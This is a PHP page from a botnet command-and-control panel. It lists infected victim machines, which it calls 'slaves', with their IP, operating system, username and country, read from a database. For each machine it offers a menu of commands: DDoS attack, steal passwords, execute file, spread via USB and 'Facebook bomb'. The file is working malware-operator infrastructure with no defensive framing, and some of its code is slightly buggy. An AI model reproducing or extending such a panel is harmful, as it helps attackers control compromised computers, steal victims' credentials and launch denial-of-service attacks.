<?
session_start();
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
if($_SESSION['botnet_session'] != $security_token) 
{
echo "<script>window.location='../index.php';</script>";
}
?>
<html>
<head>
<title>Mustafa Riadh</title>
<link rel="stylesheet" type="text/css" href="../style/plugins.css">
<link rel="stylesheet" type="text/css" href="style/main.css">
<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Lobster">
<?
if(file_exists("../mustafa.php")) 
{
$checker = fopen("../mustafa.php","r");
$copyrights = fgets($checker);
if ($copyrights != "mustafa Taktak") 
{
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
}else {
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
?>
</head>
<body>
<div id="navbar">
<img src="images/mustafa.jpg" width="50" class="image">
<a class="username"><? echo($usernamec) ?></a>
<br><br><br>
<div id="navbar-menu">
<hr class="navbar-hr" color="#3ab4a6">
<a href="index.php" style="text-decoration: none;"><font class="navbar-button-active">DASHBOARD</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="show_slaves.php" style="text-decoration: none;"><font class="navbar-button">SLAVES LIST</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="commands.php" style="text-decoration: none;"><font class="navbar-button">COMMANDS</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="passwords.php" style="text-decoration: none;"><font class="navbar-button">PASSWORDS</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="show_slaves.php" style="text-decoration: none;"><font class="navbar-button">RELOAD BOT</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="help.php" style="text-decoration: none;"><font class="navbar-button">HELP PAGE</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="about.php" style="text-decoration: none;"><font class="navbar-button">ABOUT BOT</font></a>
<hr class="navbar-hr" color="#3ab4a6">
<a href="logout.php" style="text-decoration: none;"><font class="navbar-button">LOGOUT</font></a>
<hr class="navbar-hr" color="#3ab4a6">
</div>
</div>
<div class="datagrid">
<table width="80%" style="position : absolute; left : 250px;" border="1">
<thead><tr><th>FLAG</th><th>BOT ID</th><th>BOT IP</th><th>OPERATING SYSTEM</th><th>INSTALLATION DATE</th><th>USERNAME</th><th>COUNTRY</th><th>USB SPREAD</th><th>ACTION</th></thead>
<tbody>
<?
$querry_secs = "SELECT id, ip, os, date, username, usb, country token FROM slaves";
$result4 = mysql_query($querry_secs, $connect);
$usbs = "No";
while($row = mysql_fetch_array($result4) ){
 $id = $row[0];
 $ip = $row[1];
 $os = $row[2];
 $date = $row[3];
 $username = $row[4];
 $usb = $row[5];
 $country = $row[6];
 if($usb == "T") {
    $usbs = "Yes";
 } elseif ($usb == "F") {
    $usbs == "No";
 }
 if($usb != "T")
 {
 ?>
<tr><td align="center"><img src="images/flags/<? echo($country) ?>.png" width = "40"></td><td><? echo $id ?></td><td><? echo $ip ?></td><td><? echo $os ?></td><td><? echo $date ?></td><td><? echo $username ?></td><td><? echo $country ?></td><td><? echo $usbs ?></td><td>
<form action="commands_send.php" method="post">
<input type="hidden" name="slave_id" value="<? echo $id ?>">
<input type="hidden" name="ref_link" value="show_slaves.php">
<select name="command" onchange="form.submit()"><option selected>SELECT ACTION</option><option value="ddos">DDOS ATTACK</option><option value="msgbox">MESSAGE BOX</option><option value="openlink">VISIT LINK</option><option value="bomblink">BOMB LINK</option><option value="gpasswords">GET PASSWORDS</option><option value="excutefile">EXCUTE FILE</option><option value="fbomb">FACEBOOK BOMB</option><option value="spread">START SPREADING</option><option value="delete">DELETE BOT</option></select>
</form>
</td></tr>
<?
} elseif($usb == "T")
{
?>
<tr><td align="center" bgcolor="#660099" color="#FFF"><img src="images/flags/<? echo($country) ?>.png" width = "40"></td><td bgcolor="#660099"><font color="#FFFFFF"><? echo $id ?></font></td><td bgcolor="#660099"><font color="#FFFFFF"><? echo $ip ?></font></td><td bgcolor="#660099"><font color="#FFFFFF"><? echo $os ?></font></td><td bgcolor="#660099"><font color="#FFFFFF"><? echo $date ?></font></td><td bgcolor="#660099"><font color="#FFFFFF"><? echo $username ?></font></td><td bgcolor="#660099"><font color="#FFFFFF"><? echo $country ?></font></td><td bgcolor="#660099"><font color="#FFFFFF"><? echo $usbs ?></font></td><td bgcolor="#660099">
<form action="commands_send.php" method="post">
<input type="hidden" name="slave_id" value="<? echo $id ?>">
<input type="hidden" name="ref_link" value="show_slaves.php">
<select  name="command" onchange="form.submit()"><option selected>SELECT ACTION</option><option value="ddos">DDOS ATTACK</option><option value="msgbox">MESSAGE BOX</option><option value="openlink">VISIT LINK</option><option value="bomblink">BOMB LINK</option><option value="gpasswords">GET PASSWORDS</option><option value="excutefile">EXCUTE FILE</option><option value="fbomb">FACEBOOK BOMB</option><option value="spread">START SPREADING</option><option value="delete">DELETE BOT</option></select>
</form>
</td></tr>
<?
}
}
?>
</tbody>
</table></div>
</body>
</html>